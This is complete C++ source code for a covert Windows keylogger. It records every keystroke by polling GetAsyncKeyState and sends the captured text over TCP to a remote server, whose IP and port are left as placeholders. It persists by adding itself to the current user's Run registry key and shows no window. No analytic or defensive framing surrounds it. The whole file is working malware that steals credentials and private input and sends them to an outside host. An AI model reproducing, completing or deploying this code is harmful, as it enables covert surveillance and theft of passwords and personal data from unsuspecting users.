#pragma comment(lib, "Ws2_32.lib")
#define KEY_STATE_PRESSED  0x8000 
#define CAPS_LOCK_ON       0x0001  

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <windows.h>
#include <fstream>
#include <thread> 
#include <vector>
#include <iostream>
#include <cctype>
#include <unordered_map>

struct KeyboardSymbols
{
    static const std::vector<char>& getPrintableChars()
    {
        static const std::vector<char>printableChars =
        {
            'q','w','e','r','t','y','u','i','o','p',
            'a','s','d','f','g','h','j','k','l',
            'z','x','c','v','b','n','m',
            'Q','W','E','R','T','Y','U','I','O','P',
            'A','S','D','F','G','H','J','K','L',
            'Z','X','C','V','B','N','M',
            '1','2','3','4','5','6','7','8','9','0',
        };
        return printableChars;
    }

    static const std::unordered_map<int, std::string>& getVKchar()
    {
        static const std::unordered_map<int, std::string> keyMap = {
        {VK_SPACE, "[SPACE]"},
        {VK_TAB, "[TAB]"},
        {VK_DELETE, "[DEL]"},
        {VK_BACK, "[BACK]"},
        {VK_RETURN, "[ENTER]"},
        {VK_LBUTTON, "[LBUT]"},
        {VK_RBUTTON, "[RBUT]"},
        {VK_CAPITAL, "[CAPS]"},
        {VK_MENU, "[ALT]"},
        {VK_RMENU, "[rALT]"},
        {VK_CONTROL, "[CTRL]"},
        {VK_RCONTROL, "[rCTRL]"},
        {VK_INSERT, "[INSERT]"},
        {VK_HOME, "[HOME]"},
        {VK_END, "[END]"},
        {VK_UP, "[UP]"},
        {VK_DOWN, "[DOWN]"},
        {VK_LEFT, "[LEFT]"},
        {VK_RIGHT, "[RIGHT]"},
        {VK_SHIFT, "[SHIFT]"},
        {VK_RSHIFT, "[rSHIFT]"},
        {VK_NUMPAD0, "0"},
        {VK_NUMPAD1, "1"},
        {VK_NUMPAD2, "2"},
        {VK_NUMPAD3, "3"},
        {VK_NUMPAD4, "4"},
        {VK_NUMPAD5, "5"},
        {VK_NUMPAD6, "6"},
        {VK_NUMPAD7, "7"},
        {VK_NUMPAD8, "8"},
        {VK_NUMPAD9, "9"},
        {VK_DECIMAL, "."},
        {VK_VOLUME_UP, "{VOLUME+}"},
        {VK_VOLUME_DOWN, "{VOLUME-}"},
        {VK_VOLUME_MUTE, "{VOLUME=}"},
        {191, "/"},
        {221, "]"},
        {219, "["},
        };

        return keyMap;
    }
};

void sendDataToServer(const std::string& data)
{
    struct addrinfo hints, * res;
    WSADATA         wsaData;
    SOCKET          sock = INVALID_SOCKET;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Winsock init failed" << std::endl;
        return;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

#define SERVER_IP "external_ip"
#define SERVER_PORT "port"
    int status = getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &res);

    if (status != 0) {
        std::cerr << "getaddrinfo failed: " << gai_strerror(status) << std::endl;
        WSACleanup();
        return;
    }

    sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed" << std::endl;
        freeaddrinfo(res);
        WSACleanup();
        return;
    }
    status = connect(sock, res->ai_addr, (int)res->ai_addrlen);
    if (status == SOCKET_ERROR) {
        std::cerr << "Connect failed" << std::endl;
        freeaddrinfo(res);
        closesocket(sock);
        WSACleanup();
        return;
    }

    status = send(sock, data.c_str(), (int)data.size(), 0);
    if (status == SOCKET_ERROR) {
        std::cerr << "Send failed" << std::endl;
    }

    freeaddrinfo(res);
    closesocket(sock);
    WSACleanup();
}

void keylog(const std::vector<char>& printableChars)
{
    const auto& keyMap = KeyboardSymbols::getVKchar(); 
    bool keyState[256] = { false };
    std::string dataToSend;
    bool isCapsLock, isShiftPressed, useUpperCase;

    while (true) {
        isCapsLock = (GetKeyState(VK_CAPITAL) & CAPS_LOCK_ON) != 0;
        isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & KEY_STATE_PRESSED) != 0;
        useUpperCase = (isCapsLock && !isShiftPressed) || (!isCapsLock && isShiftPressed);

        for (int i = 0; i < 256; i++) {
            if ((GetAsyncKeyState(i) & KEY_STATE_PRESSED) && !keyState[i]) {
                auto it = keyMap.find(i);

                if (it != keyMap.end()) {
                    dataToSend += it->second;
                }
                else if (isalpha(i)) {
                    char c = useUpperCase ? toupper(i) : tolower(i);
                    dataToSend += c;
                }
                else if (std::find(printableChars.begin(), printableChars.end(), char(i)) != printableChars.end()) {
                    dataToSend += char(i);
                }
                dataToSend += '\n';
                keyState[i] = true;
            }
            else if (!(GetAsyncKeyState(i) & KEY_STATE_PRESSED) && keyState[i]) {
                keyState[i] = false;
            }
        }

        if (!dataToSend.empty()) {
            sendDataToServer(dataToSend);
            dataToSend.clear();
        }

        Sleep(10);
    }
}

void AutoRun()
{
#define KEYLOGGER_PATH L"D:\\Visual_Studio_PROJECTS\\keyLogger\\x64\\Release\\key.exe"
#define REGISTRY_PATH L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    HKEY hKey;
    wchar_t arr[MAX_PATH] = KEYLOGGER_PATH;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, REGISTRY_PATH, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS){

        if (RegSetValueEx(hKey, L"key", 0, REG_SZ, (BYTE*)arr, (wcslen(arr) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS)
            RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{
    AutoRun();
    keylog(KeyboardSymbols::getPrintableChars());  
    return 0;
}
